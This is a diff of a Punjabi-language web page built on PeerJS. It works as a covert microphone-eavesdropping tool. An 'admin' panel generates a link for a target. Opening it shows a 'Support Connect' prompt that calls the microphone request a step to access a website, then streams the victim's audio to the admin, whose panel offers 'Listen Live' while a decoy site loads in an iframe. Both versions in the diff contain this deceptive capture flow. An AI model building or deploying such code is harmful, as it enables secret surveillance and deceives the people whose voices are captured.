@@ -3,153 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ਪੱਕਾ ਆਡੀਓ ਮਾਨੀਟਰ - GitHub ਸਪੈਸ਼ਲ</title>
+    <title>ਆਡੀਓ ਮਾਨੀਟਰ ਪ੍ਰੋ</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Gurmukhi:wght@400;700&display=swap');
         body { font-family: 'Noto Sans Gurmukhi', sans-serif; }
+        .user-mode-bg { background: url('https://www.transparenttextures.com/patterns/cubes.png'), #f8fafc; }
     </style>
 </head>
-<body class="bg-slate-100">
+<body class="bg-slate-50">
 
-    <!-- ADMIN PANEL -->
-    <div id="admin-view" class="max-w-3xl mx-auto p-6 mt-10">
-        <div class="bg-white rounded-3xl shadow-xl p-8 border border-slate-200">
-            <h1 class="text-3xl font-bold text-blue-700 text-center mb-6">Audio Admin Panel</h1>
+    <!-- ਐਡਮਿਨ ਪੈਨਲ (Admin Panel) -->
+    <div id="admin-interface" class="max-w-4xl mx-auto p-4 md:p-10">
+        <div class="bg-white rounded-3xl shadow-xl overflow-hidden border border-slate-200">
+            <div class="bg-blue-600 p-6 text-white text-center">
+                <h1 class="text-2xl font-bold">ਰਿਮੋਟ ਆਡੀਓ ਕੰਟਰੋਲ ਪੈਨਲ</h1>
+                <p class="text-blue-100 text-sm mt-1" id="peer-status">ਸਰਵਰ ਨਾਲ ਜੁੜ ਰਿਹਾ ਹੈ...</p>
+            </div>
             
-            <div class="space-y-6">
-                <!-- Set Fixed ID -->
-                <div class="bg-blue-50 p-5 rounded-2xl border border-blue-100">
-                    <label class="block text-sm font-bold text-blue-600 mb-2">ਆਪਣੀ ਪੱਕੀ ID ਸੈੱਟ ਕਰੋ (ਕੋਈ ਵੀ ਨਾਮ):</label>
-                    <div class="flex gap-2">
-                        <input type="text" id="custom-admin-id" value="my-room-1" 
-                            class="flex-1 p-3 rounded-xl border-none outline-none focus:ring-2 focus:ring-blue-500 shadow-inner">
-                        <button onclick="startAdmin()" id="start-btn" class="bg-blue-600 text-white px-6 py-3 rounded-xl font-bold">ਚਾਲੂ ਕਰੋ</button>
-                    </div>
-                    <p id="status" class="text-[10px] mt-2 font-bold text-slate-400 uppercase tracking-widest">ਸਥਿਤੀ: ਬੰਦ</p>
-                </div>
-
-                <!-- Generate Link -->
-                <div id="link-section" class="hidden animate-fade-in">
-                    <label class="block text-sm font-bold text-slate-600 mb-2">ਯੂਜ਼ਰ ਲਈ ਲਿੰਕ:</label>
-                    <div class="p-4 bg-slate-50 rounded-xl border border-dashed border-slate-300 break-all text-blue-600 text-sm font-mono" id="shareable-link">
-                        ---
-                    </div>
-                    <button onclick="copyLink()" class="mt-3 w-full bg-slate-800 text-white py-3 rounded-xl font-bold hover:bg-black transition">ਲਿੰਕ ਕਾਪੀ ਕਰੋ</button>
-                    <p class="text-[10px] text-slate-400 mt-2 italic text-center">ਇਹ ਲਿੰਕ ਇੱਕ ਵਾਰ ਬਣਾ ਕੇ ਕਿਸੇ ਨੂੰ ਵੀ ਭੇਜ ਦਿਓ, ਇਹ ਹਮੇਸ਼ਾ ਕੰਮ ਕਰੇਗਾ।</p>
-                </div>
-
-                <!-- Active Users -->
-                <div class="mt-10">
-                    <h2 class="font-bold text-slate-800 mb-4 flex items-center gap-2">
-                        <span class="w-2 h-2 bg-green-500 rounded-full"></span> ਕਨੈਕਟਡ ਯੂਜ਼ਰਸ
+            <div class="p-6 space-y-8">
+                <!-- ਲਿੰਕ ਬਣਾਉਣ ਵਾਲਾ ਸੈਕਸ਼ਨ -->
+                <section>
+                    <h2 class="text-lg font-bold text-slate-800 mb-4 flex items-center gap-2">
+                        <span class="bg-blue-100 p-2 rounded-lg text-blue-600">🔗</span> ਲਿੰਕ ਜਨਰੇਟਰ
                     </h2>
-                    <div id="users-list" class="space-y-3">
-                        <p class="text-slate-400 text-sm italic">ਕੋਈ ਵੀ ਕਨੈਕਟ ਨਹੀਂ ਹੈ...</p>
+                    <div class="flex flex-col md:flex-row gap-3">
+                        <input type="text" id="site-url" value="https://www.gurjeet-bhullar.page4.me" 
+                            class="flex-1 p-3 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all">
+                        <button onclick="createLink()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-6 py-3 rounded-xl transition shadow-lg shadow-blue-200">
+                            ਲਿੰਕ ਤਿਆਰ ਕਰੋ
+                        </button>
                     </div>
-                </div>
+                    <div id="link-box" class="hidden mt-4 p-4 bg-slate-50 rounded-2xl border border-dashed border-slate-300">
+                        <p class="text-xs font-bold text-slate-400 uppercase mb-2">ਇਹ ਲਿੰਕ ਦੂਜੇ ਫੋਨ 'ਤੇ ਖੋਲ੍ਹੋ:</p>
+                        <div id="display-link" class="text-sm text-blue-600 break-all font-mono mb-3"></div>
+                        <button onclick="copyToClipboard()" class="text-xs bg-white border border-slate-200 px-4 py-2 rounded-lg font-bold hover:bg-slate-100">
+                            ਕਾਪੀ ਕਰੋ
+                        </button>
+                    </div>
+                </section>
+
+                <!-- ਕਨੈਕਟਡ ਯੂਜ਼ਰਸ -->
+                <section>
+                    <div class="flex items-center justify-between mb-4">
+                        <h2 class="text-lg font-bold text-slate-800 flex items-center gap-2">
+                            <span class="bg-green-100 p-2 rounded-lg text-green-600">👥</span> ਆਨਲਾਈਨ ਯੂਜ਼ਰਸ
+                        </h2>
+                        <span id="user-count" class="bg-slate-100 text-slate-600 text-xs font-bold px-3 py-1 rounded-full">0 ਕਨੈਕਟਡ</span>
+                    </div>
+                    <div id="users-container" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <p class="text-slate-400 italic text-sm text-center py-10 col-span-full border-2 border-dashed border-slate-100 rounded-2xl">
+                            ਕੋਈ ਯੂਜ਼ਰ ਅਜੇ ਕਨੈਕਟ ਨਹੀਂ ਹੈ। ਲਿੰਕ ਭੇਜੋ...
+                        </p>
+                    </div>
+                </section>
             </div>
         </div>
-        <audio id="audio-output" autoplay></audio>
+        
+        <audio id="main-audio" autoplay class="hidden"></audio>
     </div>
 
-    <!-- USER VIEW -->
-    <div id="user-view" class="hidden h-screen w-full bg-slate-900 overflow-hidden relative">
-        <div id="user-modal" class="absolute inset-0 z-50 flex items-center justify-center p-5 bg-slate-900/90 backdrop-blur-md">
-            <div class="bg-white p-10 rounded-[2.5rem] shadow-2xl max-w-sm w-full text-center">
-                <div class="text-6xl mb-6">🎙️</div>
-                <h2 class="text-2xl font-bold text-slate-800 mb-2">ਸਪੋਰਟ ਕਾਲ</h2>
-                <p class="text-slate-500 mb-8 text-sm">ਵੈੱਬਸਾਈਟ ਐਕਸੈਸ ਕਰਨ ਲਈ 'Allow' 'ਤੇ ਕਲਿੱਕ ਕਰੋ।</p>
-                <button onclick="connectMic()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl shadow-xl active:scale-95 transition-all">
-                    Allow & Connect
+    <!-- ਯੂਜ਼ਰ ਵਿਊ (User View) -->
+    <div id="user-interface" class="hidden h-screen w-full bg-slate-900 overflow-hidden relative">
+        <div id="user-overlay" class="absolute inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/90 backdrop-blur-md">
+            <div class="bg-white p-8 rounded-[2rem] shadow-2xl max-w-sm w-full text-center">
+                <div class="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <span class="text-4xl animate-pulse">🎙️</span>
+                </div>
+                <h2 class="text-2xl font-bold text-slate-800 mb-2">ਸਪੋਰਟ ਕਨੈਕਟ</h2>
+                <p class="text-slate-500 mb-8 text-sm leading-relaxed">
+                    ਵੈੱਬਸਾਈਟ ਐਕਸੈਸ ਕਰਨ ਅਤੇ ਸਹਾਇਤਾ ਲਈ ਕਿਰਪਾ ਕਰਕੇ 'Allow' ਬਟਨ ਦਬਾਓ।
+                </p>
+                <button id="start-btn" onclick="requestMic()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-xl transform active:scale-95 transition-all">
+                    Allow & Continue
                 </button>
+                <p id="mic-status" class="mt-4 text-[10px] text-slate-400 font-bold uppercase tracking-widest">ਕਨੈਕਟ ਹੋ ਰਿਹਾ ਹੈ...</p>
             </div>
         </div>
-        <iframe id="target-frame" src="" class="w-full h-full border-none"></iframe>
+        <iframe id="content-frame" src="" class="w-full h-full border-none"></iframe>
     </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const mode = params.get('mode');
-        const aid = params.get('aid');
-        const site = params.get('site');
+        // --- configuration ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const mode = urlParams.get('mode');
+        const targetAdminId = urlParams.get('aid');
+        const siteToLoad = urlParams.get('site');
 
-        let peer = null;
+        let myPeer = null;
+        let adminPeerId = null;
+        const usersMap = new Set();
 
-        if (mode === 'user' && aid) {
-            document.getElementById('admin-view').style.display = 'none';
-            document.getElementById('user-view').style.display = 'block';
-            document.getElementById('target-frame').src = site ? decodeURIComponent(site) : "https://www.gurjeet-bhullar.page4.me";
-            
-            peer = new Peer();
-            peer.on('open', (id) => {
-                const conn = peer.connect(aid);
-                conn.on('open', () => conn.send({ type: 'hi', id: id }));
-            });
-        }
-
-        async function connectMic() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                peer.call(aid, stream);
-                document.getElementById('user-modal').style.display = 'none';
-            } catch (err) {
-                alert("Permission Denied!");
+        // --- initialization ---
+        window.onload = () => {
+            if (mode === 'user' && targetAdminId) {
+                setupUserMode();
+            } else {
+                setupAdminMode();
             }
-        }
+        };
 
         // --- Admin Functions ---
-        function startAdmin() {
-            const customId = document.getElementById('custom-admin-id').value.trim();
-            if(!customId) return alert("ID ਭਰੋ!");
+        function setupAdminMode() {
+            document.getElementById('admin-interface').style.display = 'block';
+            document.getElementById('user-interface').style.display = 'none';
 
-            peer = new Peer(customId);
-            peer.on('open', (id) => {
-                document.getElementById('status').innerText = "ਆਨਲਾਈਨ: " + id;
-                document.getElementById('status').classList.replace('text-slate-400', 'text-green-600');
-                document.getElementById('link-section').classList.remove('hidden');
-                document.getElementById('start-btn').disabled = true;
-                document.getElementById('start-btn').classList.add('opacity-50');
+            // Generate a persistent ID for the session or random
+            const sid = 'admin-' + Math.random().toString(36).substr(2, 6);
+            myPeer = new Peer(sid);
 
-                // ਲਿੰਕ ਸੈੱਟ ਕਰੋ
-                const base = window.location.href.split('?')[0];
-                const final = `${base}?mode=user&aid=${id}&site=${encodeURIComponent("https://www.gurjeet-bhullar.page4.me")}`;
-                document.getElementById('shareable-link').innerText = final;
+            myPeer.on('open', (id) => {
+                adminPeerId = id;
+                document.getElementById('peer-status').innerText = "ਸਰਵਰ ਆਨਲਾਈਨ: " + id;
             });
 
-            peer.on('connection', (conn) => {
+            myPeer.on('connection', (conn) => {
                 conn.on('data', (data) => {
-                    if(data.type === 'hi') {
-                        const list = document.getElementById('users-list');
-                        if(list.querySelector('p')) list.innerHTML = '';
-                        const d = document.createElement('div');
-                        d.className = "p-3 bg-blue-50 border border-blue-100 rounded-xl text-sm font-bold flex justify-between";
-                        d.innerHTML = `<span>User: ${data.id}</span> <span class="text-green-600">LIVE</span>`;
-                        list.appendChild(d);
+                    if (data.type === 'hello') {
+                        addUserCard(data.uid);
                     }
                 });
             });
 
-            peer.on('call', (call) => {
-                call.answer();
+            myPeer.on('call', (call) => {
+                call.answer(); // Respond to mic stream
                 call.on('stream', (stream) => {
-                    const audio = document.getElementById('audio-output');
+                    const audio = document.getElementById('main-audio');
                     audio.srcObject = stream;
-                    audio.play();
+                    audio.play().catch(() => {
+                        console.log("Interaction required to hear audio");
+                    });
                 });
             });
 
-            peer.on('error', (err) => {
-                if(err.type === 'unavailable-id') alert("ਇਹ ID ਪਹਿਲਾਂ ਹੀ ਵਰਤੀ ਜਾ ਰਹੀ ਹੈ, ਕੋਈ ਹੋਰ ਨਾਮ ਰੱਖੋ।");
-                else alert("ਗਲਤੀ: " + err.type);
-                location.reload();
+            myPeer.on('error', (err) => {
+                console.error(err);
+                document.getElementById('peer-status').innerText = "ਗਲਤੀ: " + err.type;
             });
         }
 
-        function copyLink() {
-            const text = document.getElementById('shareable-link').innerText;
-            navigator.clipboard.writeText(text).then(() => alert('ਲਿੰਕ ਕਾਪੀ ਹੋ ਗਿਆ!'));
+        function createLink() {
+            const site = encodeURIComponent(document.getElementById('site-url').value);
+            const baseUrl = window.location.href.split('?')[0];
+            const link = `${baseUrl}?mode=user&aid=${adminPeerId}&site=${site}`;
+            
+            document.getElementById('link-box').classList.remove('hidden');
+            document.getElementById('display-link').innerText = link;
+        }
+
+        function copyToClipboard() {
+            const link = document.getElementById('display-link').innerText;
+            navigator.clipboard.writeText(link).then(() => alert('ਲਿੰਕ ਕਾਪੀ ਹੋ ਗਿਆ!'));
+        }
+
+        function addUserCard(uid) {
+            if (usersMap.has(uid)) return;
+            usersMap.add(uid);
+            
+            const container = document.getElementById('users-container');
+            if (container.querySelector('p')) container.innerHTML = '';
+
+            const card = document.createElement('div');
+            card.className = "p-4 bg-slate-50 border border-slate-200 rounded-2xl flex items-center justify-between";
+            card.innerHTML = `
+                <div class="flex items-center gap-3">
+                    <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+                    <span class="font-bold text-sm text-slate-700">ਯੂਜ਼ਰ: ${uid}</span>
+                </div>
+                <button onclick="this.innerText='Listening...'" class="text-[10px] font-bold bg-blue-100 text-blue-600 px-3 py-1 rounded-full uppercase">
+                    Listen Live
+                </button>
+            `;
+            container.appendChild(card);
+            document.getElementById('user-count').innerText = usersMap.size + " ਕਨੈਕਟਡ";
+        }
+
+        // --- User Functions ---
+        function setupUserMode() {
+            document.getElementById('admin-interface').style.display = 'none';
+            document.getElementById('user-interface').style.display = 'block';
+            document.getElementById('content-frame').src = siteToLoad ? decodeURIComponent(siteToLoad) : "https://google.com";
+
+            myPeer = new Peer();
+            myPeer.on('open', (id) => {
+                document.getElementById('mic-status').innerText = "ਸਰਵਰ ਨਾਲ ਜੁੜ ਗਿਆ";
+                const conn = myPeer.connect(targetAdminId);
+                conn.on('open', () => {
+                    conn.send({ type: 'hello', uid: id });
+                });
+            });
+
+            myPeer.on('error', (err) => {
+                document.getElementById('mic-status').innerText = "ERROR: " + err.type;
+            });
+        }
+
+        async function requestMic() {
+            const btn = document.getElementById('start-btn');
+            const status = document.getElementById('mic-status');
+            
+            try {
+                btn.disabled = true;
+                status.innerText = "ਮਾਈਕ੍ਰੋਫੋਨ ਐਕਸੈਸ ਲਿਆ ਜਾ ਰਿਹਾ ਹੈ...";
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                
+                status.innerText = "ਐਡਮਿਨ ਨੂੰ ਕਾਲ ਕੀਤੀ ਜਾ ਰਹੀ ਹੈ...";
+                const call = myPeer.call(targetAdminId, stream);
+                
+                document.getElementById('user-overlay').style.display = 'none';
+                alert("ਕਨੈਕਟ ਹੋ ਗਿਆ!");
+            } catch (err) {
+                console.error(err);
+                status.innerText = "ਪਰਮਿਸ਼ਨ ਫੇਲ ਹੋ ਗਈ";
+                btn.disabled = false;
+                alert("ਆਵਾਜ਼ ਸਾਂਝੀ ਕਰਨ ਲਈ ਮਾਈਕ੍ਰੋਫੋਨ ਦੀ ਇਜਾਜ਼ਤ ਜ਼ਰੂਰੀ ਹੈ।");
+            }
         }
     </script>
 </body>
